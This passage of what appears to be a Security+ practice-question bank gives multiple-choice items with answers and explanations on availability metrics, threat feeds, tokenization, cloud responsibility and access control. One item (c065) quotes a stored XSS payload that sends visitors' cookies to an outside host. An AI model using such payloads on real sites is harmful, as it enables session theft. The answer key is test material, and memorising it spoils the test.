  {t:"A layer 4 firewall at each branch",ok:false,x:"A firewall filters traffic; it does not create an encrypted multi-link overlay or manage path selection."},
  {t:"A jump server at headquarters",ok:false,x:"A jump server is an administrative access point for managing hosts, not a WAN connectivity solution."}
 ],
 w:"SD-WAN = centrally managed, encrypted overlay over multiple links with dynamic path selection. SASE adds cloud-delivered security services on top."},

{id:"c062",obj:"5.2",d:5,cat:"gov",t:"mc",
 q:"A city's business impact analysis includes the figures below for its permit system. Which of the following metrics describes the average time to restore the system after a failure?",
 ex:"Permit system - availability record, last 12 months\nFailures: 4\nTotal time between failures (average): 2,190 hours\nOutage durations: 3 h, 5 h, 2 h, 6 h\nAverage outage: 4 hours",
 o:[
  {t:"MTTR of 4 hours",ok:true,x:"Mean time to repair is the average time from failure to restoration; the average of the four outage durations is 4 hours."},
  {t:"MTBF of 4 hours",ok:false,x:"Mean time between failures measures how long the system typically runs before failing, which here is 2,190 hours, not 4."},
  {t:"RTO of 2,190 hours",ok:false,x:"RTO is the target maximum downtime set by the business, not a measured value, and 2,190 hours is the between-failure interval."},
  {t:"RPO of 4 hours",ok:false,x:"RPO is the acceptable amount of data loss measured in time; it is unrelated to how long repairs take."}
 ],
 w:"MTBF = average uptime between failures; MTTR = average time to restore; RTO = maximum acceptable downtime; RPO = maximum acceptable data loss."},

{id:"c063",obj:"4.3",d:4,cat:"ops",t:"mc",
 q:"A city IT director wants early warning about attacks targeting other municipalities, shared in a trusted, sector-specific community, so the city can block indicators before being hit. Which of the following threat-feed sources BEST fits?",
 o:[
  {t:"An information sharing and analysis center for the government sector",ok:true,x:"ISACs are sector-specific communities where members share indicators and attack details, giving peers in the same sector early warning."},
  {t:"Open-source intelligence from public blogs",ok:false,x:"OSINT is freely available but is neither sector-specific nor a trusted community with vetted member reporting."},
  {t:"Dark web monitoring for leaked credentials",ok:false,x:"Dark web monitoring detects the city's own exposed data; it does not provide peer reports of attacks on other municipalities."},
  {t:"The vendor's proprietary antivirus signature feed",ok:false,x:"Vendor signatures cover known malware broadly and do not offer sector-specific peer intelligence."}
 ],
 w:"Threat feeds come from OSINT, proprietary vendors, ISACs, and dark web sources. ISACs are the sector-based sharing communities."},

{id:"c064",obj:"1.4",d:1,cat:"crypto",t:"mc",
 q:"A city's online payment portal must let residents save a card for future payments, but the city does not want actual card numbers stored anywhere on its systems. The payment provider will return a substitute value that maps back to the card only inside the provider's vault. Which of the following techniques is being used?",
 o:[
  {t:"Tokenization",ok:true,x:"Tokenization replaces the sensitive value with a non-sensitive token; the real data lives only in a secure vault held by the provider. The city stores just the token."},
  {t:"Hashing",ok:false,x:"A hash is one-way; the provider could not map a hash back to the card to charge it, and identical cards would produce identical hashes."},
  {t:"Data masking",ok:false,x:"Masking hides parts of a value for display, such as showing only the last four digits; it does not create a reusable reference to the original."},
  {t:"Steganography",ok:false,x:"Steganography hides data inside other files, such as images; it is not a method for substituting stored card numbers."}
 ],
 w:"Tokenization = reversible substitution via a vault, reducing scope for card data. Masking = display obfuscation. Hashing = one-way integrity."},

{id:"c065",obj:"2.3",d:2,cat:"vulns",t:"mc",
 q:"A city's public comment portal stores what visitors submit and shows it to other visitors. The web log shows the request below, and afterward every user who opens the comments page has their session cookie sent to an outside host. Which of the following BEST describes the vulnerability?",
 ex:"POST /comments/new  form=comment  body=Great+meeting!%3Cscript%3Efetch('https://203.0.113.88/c?'+document.cookie)%3C/script%3E",
 o:[
  {t:"Stored cross-site scripting due to missing input validation and output encoding",ok:true,x:"The script was saved by the server and executed in every later visitor's browser, exfiltrating cookies. That is stored XSS, prevented by validating input and encoding output."},
  {t:"SQL injection against the comments table",ok:false,x:"The payload is JavaScript aimed at browsers, not SQL syntax aimed at the database query."},
  {t:"Directory traversal to read server files",ok:false,x:"Traversal uses ../ sequences to escape a directory; nothing here attempts to read server files."},
  {t:"Buffer overflow in the web server",ok:false,x:"A buffer overflow corrupts memory with oversized input; this is a short, well-formed submission that abuses how the page renders content."}
 ],
 w:"Stored XSS persists on the server and hits every viewer. Fix with input validation, output encoding, and HttpOnly cookies."},

{id:"c066",obj:"4.5",d:4,cat:"ops",t:"mc",
 q:"A consultancy notices malware on remote laptops contacting command-and-control servers over non-HTTP protocols, which the existing web proxy never sees. The firm wants to stop endpoints from ever resolving known malicious hostnames, wherever the laptop is. Which of the following should be deployed?",
 o:[
  {t:"DNS filtering with the laptops configured to use the protective resolver",ok:true,x:"A protective DNS service refuses to resolve known malicious names, so the C2 connection fails before any protocol is used. It works for all traffic types and off-network."},
  {t:"A stricter URL block list on the web proxy",ok:false,x:"The proxy only handles web traffic; the malware is using other protocols that never pass through it."},
  {t:"Full packet capture at the headquarters firewall",ok:false,x:"Remote laptops do not route through headquarters, and capture only records traffic rather than blocking it."},
  {t:"SNMP monitoring of the laptops",ok:false,x:"SNMP reports device status and counters; it has no ability to block name resolution."}
 ],
 w:"DNS filtering blocks at the resolution step regardless of protocol, complementing web proxies that see only HTTP/HTTPS."},

{id:"c067",obj:"3.4",d:3,cat:"data",t:"mc",
 q:"A city uses the same vendor's firewalls at the internet edge, between internal zones, and at every remote facility. A critical vulnerability in that vendor's software leaves all of them exposed at once. Which of the following resilience concepts would have reduced this risk?",
 o:[
  {t:"Platform diversity",ok:true,x:"Using different vendors or platforms at different layers means one vendor's flaw does not compromise every control simultaneously."},
  {t:"Load balancing",ok:false,x:"Load balancing distributes traffic among identical nodes for capacity and availability; identical vulnerable nodes are still all vulnerable."},
  {t:"A warm site",ok:false,x:"A recovery site addresses facility loss, not a software flaw that affects all identical devices including any at the warm site."},
  {t:"Journaling",ok:false,x:"Journaling records data changes for recovery; it has nothing to do with vendor concentration risk."}
 ],
 w:"Platform diversity and multi-cloud both reduce the impact of a single vendor's failure or vulnerability."},

{id:"c068",obj:"5.1",d:5,cat:"gov",t:"mc",
 q:"A consultancy's security policy says departing staff must lose all access on their last day. IT has written a numbered checklist: disable the directory account, revoke SaaS licenses, wipe the laptop, collect the badge, and confirm each step with HR. Which of the following BEST describes the checklist?",
 o:[
  {t:"An offboarding procedure",ok:true,x:"A step-by-step, ordered set of actions that implements a policy requirement is a procedure. Offboarding is a named procedure in the governance objectives."},
  {t:"An access control standard",ok:false,x:"A standard states mandatory requirements, such as which access must be removed; it does not walk through the sequence of tasks."},
  {t:"A security guideline",ok:false,x:"Guidelines are optional recommendations. This checklist is mandatory and prescriptive."},
  {t:"An acceptable use policy",ok:false,x:"The AUP governs how employees use resources while employed; it is unrelated to the mechanics of removing access."}
 ],
 w:"Procedures are the how: ordered steps such as onboarding, offboarding, change management, and playbooks."},

{id:"c069",obj:"4.7",d:4,cat:"ops",t:"mc",
 q:"An MSP built an orchestration server that handles every client's account provisioning, patch scheduling, and alert routing. When the server's disk failed, no client received patches or alerts for two days and no accounts could be created. Which of the following automation considerations does this illustrate?",
 o:[
  {t:"Single point of failure",ok:true,x:"Centralizing every automated workflow on one unreplicated system means its failure halts all of them. Automation platforms need redundancy like any other critical service."},
  {t:"Technical debt",ok:false,x:"Technical debt refers to shortcuts in design or code that must be reworked later; the failure here was a lack of redundancy, not poor code quality."},
  {t:"Complexity",ok:false,x:"The workflows may or may not be complex; the outage was caused by one host going down, not by the difficulty of understanding the system."},
  {t:"Ongoing supportability",ok:false,x:"Supportability concerns whether staff can maintain the automation over time. The server was maintainable; it simply had no failover."}
 ],
 w:"Automation drawbacks: complexity, cost, single point of failure, technical debt, and ongoing supportability. Build orchestration with redundancy."},

{id:"c070",obj:"2.4",d:2,cat:"attacks",t:"mc",
 q:"A consultancy's code-signing process still uses an older hash algorithm. An attacker submits a benign-looking installer that gets signed, then swaps in a malicious installer crafted to produce the same hash value, so the existing signature validates the malicious file. Which of the following attacks has occurred?",
 o:[
  {t:"A collision attack against the hash algorithm",ok:true,x:"Two different inputs producing the same hash is a collision. Because the signature covers the hash, it validates any file with that hash value."},
  {t:"A downgrade attack against TLS",ok:false,x:"Downgrade attacks force weaker protocol versions during negotiation; no network protocol negotiation is involved in verifying a file signature."},
  {t:"A brute-force attack on the signing private key",ok:false,x:"The private key was not recovered; the attacker exploited a weakness in the hash, not in the key."},
  {t:"Credential replay",ok:false,x:"Replay reuses captured authentication data. A forged installer hash is a cryptographic weakness, not a reused credential."}
 ],
 w:"Collision = two inputs, same hash. Deprecated hashes like MD5 and SHA-1 must not be used for signatures; use SHA-256 or stronger."},

{id:"c071",obj:"3.1",d:3,cat:"arch",t:"mc",
 q:"A consultancy moves a report-generation job to a cloud function that runs only when triggered and is billed per execution. The team asks who is responsible for patching the operating system and runtime the function executes on. Which of the following is correct?",
 o:[
  {t:"The cloud provider, because serverless abstracts the OS and runtime away from the customer",ok:true,x:"In a serverless model the provider manages the underlying servers, OS, and runtime. The customer is responsible for the function code, its dependencies, and its configuration."},
  {t:"The consultancy, because it owns the virtual machine the function runs on",ok:false,x:"There is no customer-managed VM in serverless; that is the IaaS model."},
  {t:"Neither, because serverless functions do not run on an operating system",ok:false,x:"Functions still execute on real hosts with an OS; the customer simply does not see or manage them."},
  {t:"The consultancy, because the responsibility matrix always assigns patching to the customer",ok:false,x:"The matrix shifts responsibility toward the provider as the service moves from IaaS to PaaS/serverless to SaaS."}
 ],
 w:"Shared responsibility: the customer always owns its data and code; the provider takes on more of the stack (OS, runtime) in PaaS, serverless, and SaaS."},

{id:"c072",obj:"5.1",d:5,cat:"gov",t:"mc",
 q:"An MSP engineer, convinced a client's firewall needed a rule change immediately, made the change on a Friday afternoon without submitting a request or notifying anyone. The change broke the client's VoIP service over the weekend. Which of the following change management elements was bypassed?",
 o:[
  {t:"The approval process",ok:true,x:"No request was submitted and no one authorized the change, so the approval step that would have prompted review, testing, and stakeholder notification was skipped entirely."},
  {t:"Version control",ok:false,x:"Version control tracks configuration revisions; while useful for rollback, it is not the step whose absence allowed an unreviewed change to go live."},
  {t:"The maintenance window",ok:false,x:"A window schedules when approved changes occur. The core failure was that this change was never approved to begin with."},
  {t:"Allow and deny list updates",ok:false,x:"Allow and deny lists are a technical implication of some changes, not the governance step that was bypassed."}
 ],
 w:"Change management requires an approval process with ownership, stakeholders, impact analysis, test results, and a backout plan before implementation."},

{id:"c073",obj:"4.6",d:4,cat:"iam",t:"mc",
 q:"An MSP's engineers all know the same local administrator password for hundreds of client servers, and it has not changed in two years. The MSP wants each privileged session to use a credential checked out per use, rotated after use, and logged to a specific engineer. Which of the following should be implemented?",
 o:[
  {t:"Privileged access management with password vaulting and automatic rotation",ok:true,x:"A PAM vault stores privileged credentials, releases them on check-out to a named engineer, records the session, and rotates the password afterward, eliminating the shared static secret."},
  {t:"Single sign-on with SAML for the engineers",ok:false,x:"SSO simplifies user login to applications; it does not vault or rotate local administrator passwords on client servers."},
  {t:"A longer, more complex shared password",ok:false,x:"A stronger shared password is still shared and static, so there is no individual accountability or rotation."},
  {t:"Role-based access control on the ticketing system",ok:false,x:"Controlling ticket permissions does nothing about the shared server password."}
 ],
 w:"PAM = vaulting, just-in-time access, ephemeral credentials, and session recording for privileged accounts."},

{id:"c074",obj:"1.2",d:1,cat:"controls",t:"mc",
 q:"A city water treatment plant is surrounded by a fence in an open field. The security team wants to detect a person crossing the perimeter at night, in fog, without relying on visible light or body heat, and without wiring sensors into the ground. Which of the following sensor types BEST meets these requirements?",
 o:[
  {t:"Microwave",ok:true,x:"Microwave sensors emit radio energy and detect disturbances in the reflected signal, so they work in darkness and fog and do not depend on heat or buried hardware."},
  {t:"Infrared",ok:false,x:"Passive infrared relies on detecting body heat, which the team specifically wants to avoid depending on, and heavy fog can degrade it."},
  {t:"Pressure",ok:false,x:"Pressure sensors must be installed in the ground or under mats, which the team ruled out."},
  {t:"Video surveillance with standard cameras",ok:false,x:"Standard cameras need visible light and are unreliable at night in fog."}
 ],
 w:"Physical sensors: infrared (heat), pressure (weight on a surface), microwave (radio reflection), ultrasonic (sound). Pick by environment and constraints."},

{id:"c075",obj:"2.5",d:2,cat:"vulns",t:"mc",
 q:"A city installs 60 network-connected security cameras from a vendor. A week later, an external party is viewing the feeds. The MSP reviewing the incident finds the cameras still accept the login printed in the installation manual. Which of the following should have been done FIRST during deployment to prevent this?",
 o:[
  {t:"Change the default credentials on every camera before connecting it to the network",ok:true,x:"Default credentials are publicly known and are the first thing scanned for. Replacing them before exposure removes the vector that was actually used."},
  {t:"Enable full-disk encryption on the recording server",ok:false,x:"Encrypting stored video does not stop someone logging into a camera with its known default password to watch live."},
  {t:"Perform a wireless site survey",ok:false,x:"A site survey addresses coverage and interference; it does not address device authentication."},
  {t:"Subscribe the city to a threat intelligence feed",ok:false,x:"Intelligence might report the default-password risk, but the actual preventive step is changing the credentials."}
 ],
 w:"Hardening embedded and IoT devices starts with changing defaults, disabling unneeded services, updating firmware, and segmenting them from user networks."},

{id:"c076",obj:"4.1",d:4,cat:"harden",t:"mc",
 q:"An MSP wants to analyze suspicious email attachments for its clients by running each file in an isolated virtual environment that records what the file does, without letting it touch production systems. Which of the following BEST describes this technique?",
 o:[
  {t:"Sandboxing",ok:true,x:"A sandbox executes untrusted code in an isolated environment to observe behavior such as file writes and network calls, with no access to real systems."},
  {t:"Static code analysis",ok:false,x:"Static analysis examines source or binaries without executing them; the MSP wants to observe runtime behavior."},
  {t:"Code signing",ok:false,x:"Signing proves who published a file; it does not reveal what an unknown attachment does when run."},
  {t:"File integrity monitoring",ok:false,x:"FIM watches for changes to protected files on production hosts; it does not detonate unknown files."}
 ],
 w:"Sandboxing = isolated execution to observe behavior. Static analysis = inspect without running. Dynamic analysis = test while running."},

{id:"c077",obj:"5.5",d:5,cat:"third",t:"mc",
 q:"A consultancy contracts a testing firm to attack its environment while the consultancy's own SOC actively tries to detect and stop the attackers, with both teams sharing findings in real time to improve detections. Which of the following BEST describes this engagement?",
 o:[
  {t:"Integrated penetration test",ok:true,x:"Combining offensive and defensive teams working together and sharing information is an integrated (purple team) engagement."},
  {t:"Offensive penetration test only",ok:false,x:"A purely offensive test focuses on breaking in; it does not include the defenders collaborating in real time."},
  {t:"Physical penetration test",ok:false,x:"Physical testing targets facilities, doors, and badges; this engagement is against the network and detection capability."},
  {t:"Passive reconnaissance",ok:false,x:"Passive recon is an information-gathering phase using public sources, not an entire collaborative engagement."}
 ],
 w:"Offensive = red team attacks; defensive = blue team detects; integrated = both work together (purple) to improve detection and response."},

{id:"c078",obj:"3.4",d:3,cat:"data",t:"mc",
 q:"A city's permit database must stay available if the server hosting it fails, and the replacement node must have the same current data and take over automatically within seconds. Which of the following high-availability approaches BEST meets this need?",
 o:[
  {t:"A failover cluster with shared or replicated storage",ok:true,x:"Clustering keeps a standby node aware of the same state and shifts the workload automatically on failure, which is what a stateful database needs."},
  {t:"A load balancer distributing queries across independent database servers",ok:false,x:"Load balancing spreads requests among nodes but does not by itself keep separate databases in sync; writes would diverge."},
  {t:"Nightly full backups to an offsite location",ok:false,x:"Backups enable recovery, but restoring takes hours and loses data since the last backup; they do not provide automatic seconds-level takeover."},
  {t:"A warm site with hardware but no current data",ok:false,x:"A warm site requires data restoration before use and cannot fail over automatically within seconds."}
 ],
 w:"Load balancing = share traffic across stateless nodes; clustering = coordinated nodes with shared state and automatic failover for stateful services."},

{id:"c079",obj:"4.5",d:4,cat:"harden",t:"mc",
 q:"An MSP hardens Linux web servers for a client. Even if the web service is compromised, the MSP wants the kernel to prevent the web process from reading files or opening sockets outside a defined policy, regardless of the file permissions the process owner has. Which of the following should be enabled?",
 o:[
  {t:"SELinux in enforcing mode",ok:true,x:"SELinux applies mandatory access control policies at the kernel level, confining each process to labeled resources even when standard permissions would allow more."},
  {t:"Group Policy",ok:false,x:"Group Policy configures Windows systems through Active Directory; it does not apply to Linux kernels."},
  {t:"A host-based firewall",ok:false,x:"A host firewall controls network ports, but it does not restrict which files a compromised process may read."},
  {t:"Full-disk encryption",ok:false,x:"Disk encryption protects data when the disk is offline; a running process on the booted system reads files normally."}
 ],
 w:"SELinux = mandatory access control on Linux. Group Policy = centralized configuration on Windows. Both are OS-level security features in the 701 objectives."},

{id:"c080",obj:"2.5",d:2,cat:"vulns",t:"mc",
 q:"An MSP's EDR alerts that a client workstation is beaconing to a suspicious domain. The technician moves the workstation to a VLAN that has no route to any other system or the internet, keeps it powered on for evidence collection, and begins investigating. Which of the following mitigation techniques was applied?",
 o:[
  {t:"Isolation",ok:true,x:"Cutting the host off from all other systems while preserving it for analysis is isolation, a containment technique that stops lateral movement and C2 traffic."},
  {t:"Segmentation",ok:false,x:"Segmentation is a preplanned design that divides the network into zones with controlled paths between them; this was a reactive removal of one host from all communication."},
  {t:"Decommissioning",ok:false,x:"Decommissioning permanently retires a system. The workstation is kept running for investigation, not retired."},
  {t:"Patching",ok:false,x:"No update was applied; the technician contained the host rather than fixing a vulnerability."}
 ],
 w:"Isolation = remove a compromised host from all communication. Segmentation = architectural division of the network into controlled zones."},

{id:"c081",obj:"5.3",d:5,cat:"third",t:"mc",
 q:"A consultancy relies on a SaaS vendor to store client deliverables. Each year the consultancy sends the vendor a detailed set of questions about its encryption, access controls, incident history, and subcontractors, and reviews the responses before renewing. Which of the following BEST describes this activity?",
 o:[
  {t:"Vendor monitoring using a security questionnaire",ok:true,x:"Recurring questionnaires are a standard vendor-monitoring method for verifying that a supplier's controls remain acceptable throughout the relationship."},
  {t:"A right-to-audit clause being exercised",ok:false,x:"Exercising right-to-audit means the consultancy's auditors inspect the vendor directly; a questionnaire relies on the vendor's own answers."},
  {t:"Establishing rules of engagement",ok:false,x:"Rules of engagement define the scope and limits of a penetration test, not an annual supplier review."},
  {t:"A conflict of interest review",ok:false,x:"Conflict of interest checks look at relationships that could bias vendor selection; they do not assess technical controls."}
 ],
 w:"Third-party risk: assess before selection (due diligence), then monitor continuously with questionnaires, audits, and evidence reviews."},

{id:"c082",obj:"1.4",d:1,cat:"crypto",t:"mc",
 q:"A consultancy's staff carry laptops to client sites, and two have been stolen from vehicles. The firm wants every file on a stolen laptop to be unreadable even if the drive is removed, with no change to how users work and no per-file decisions. Which of the following BEST meets this goal?",
 o:[
  {t:"Full-disk encryption with the key protected by the laptop's TPM",ok:true,x:"FDE encrypts the entire drive transparently, and binding the key to the TPM means a removed disk cannot be decrypted on another machine. Users do nothing extra."},
  {t:"File-level encryption applied by each user to sensitive documents",ok:false,x:"Per-file encryption depends on users choosing which files to protect, which the firm explicitly does not want, and leaves everything else exposed."},
  {t:"Transport encryption via an always-on VPN",ok:false,x:"A VPN protects data in transit; it does nothing for files at rest on a stolen drive."},
  {t:"Database-level encryption for the client records store",ok:false,x:"Encrypting one database on a server does not protect the files on the laptops that were stolen."}
 ],
 w:"Encryption levels: full-disk, partition, volume, file, database, record. For lost devices, full-disk with hardware-protected keys is the baseline."},

{id:"c083",obj:"3.1",d:3,cat:"arch",t:"mc",
 q:"A city moves its GIS application to virtual machines in a public cloud IaaS offering. After a scan shows the VMs running an unpatched operating system, the city claims the provider is at fault. Which of the following is correct under the shared responsibility model?",
 o:[
  {t:"The city is responsible for patching the guest OS; the provider secures the hypervisor and physical hosts",ok:true,x:"In IaaS the customer controls and must maintain everything from the guest operating system upward, while the provider handles the underlying compute, storage, and hypervisor."},
  {t:"The provider is responsible for patching the guest OS in every cloud model",ok:false,x:"The provider patches the OS only in models where it manages it, such as PaaS and SaaS, not for customer-managed IaaS VMs."},
  {t:"Neither party is responsible because the scan was run by the city",ok:false,x:"Who ran the scan does not change responsibility; the VMs are the city's to maintain."},
  {t:"The city is responsible for the hypervisor firmware but not the guest OS",ok:false,x:"This is reversed. Customers never touch the provider's hypervisor; they do own the guest OS."}
 ],
 w:"IaaS: provider = facilities, hardware, hypervisor; customer = OS, middleware, apps, data. Responsibility shifts toward the provider in PaaS and SaaS."},

{id:"c084",obj:"5.3",d:5,cat:"third",t:"mc",
 q:"Before choosing an MSP, a city reviews the candidate's financial stability, checks references from other municipalities, verifies its certifications, and examines its incident history. Which of the following BEST describes this activity?",
 o:[
  {t:"Due diligence during vendor selection",ok:true,x:"Investigating a prospective vendor's background, capability, and track record before entering a contract is due diligence."},
  {t:"Due care",ok:false,x:"Due care is the ongoing, reasonable effort to maintain protections after a decision; the pre-contract investigation is due diligence."},
  {t:"A right-to-audit review",ok:false,x:"Right-to-audit is a contract clause exercised during the relationship; no contract exists yet."},
  {t:"Attestation",ok:false,x:"Attestation is a formal statement by a party that something is true, such as the vendor certifying its own compliance; the city is doing its own research here."}
 ],
 w:"Due diligence = investigate before committing. Due care = act responsibly on an ongoing basis. Both apply to vendor selection and monitoring."},

{id:"c085",obj:"3.3",d:3,cat:"data",t:"mc",
 q:"A remote-first consultancy operates only in North America and stores client data in a cloud tenant. To reduce the impact of stolen credentials, it wants any login attempt to that tenant from outside the countries where it does business to be refused automatically. Which of the following data protection methods is this?",
 o:[
  {t:"Geographic restrictions",ok:true,x:"Geographic restrictions use the source location of a request to allow or deny access, which directly implements a country-based login rule."},
  {t:"Data sovereignty",ok:false,x:"Sovereignty is a legal principle that data is subject to the laws of where it is stored; it is not an access control on login location."},
  {t:"Tokenization",ok:false,x:"Tokenization substitutes sensitive values with tokens and has nothing to do with where a login originates."},
  {t:"Segmentation",ok:false,x:"Segmentation divides networks or data stores into zones; it does not evaluate the geographic origin of a request."}
 ],
 w:"Geolocation-based restrictions are a data protection method in the 701 objectives; sovereignty is the legal consideration about where data resides."},
];
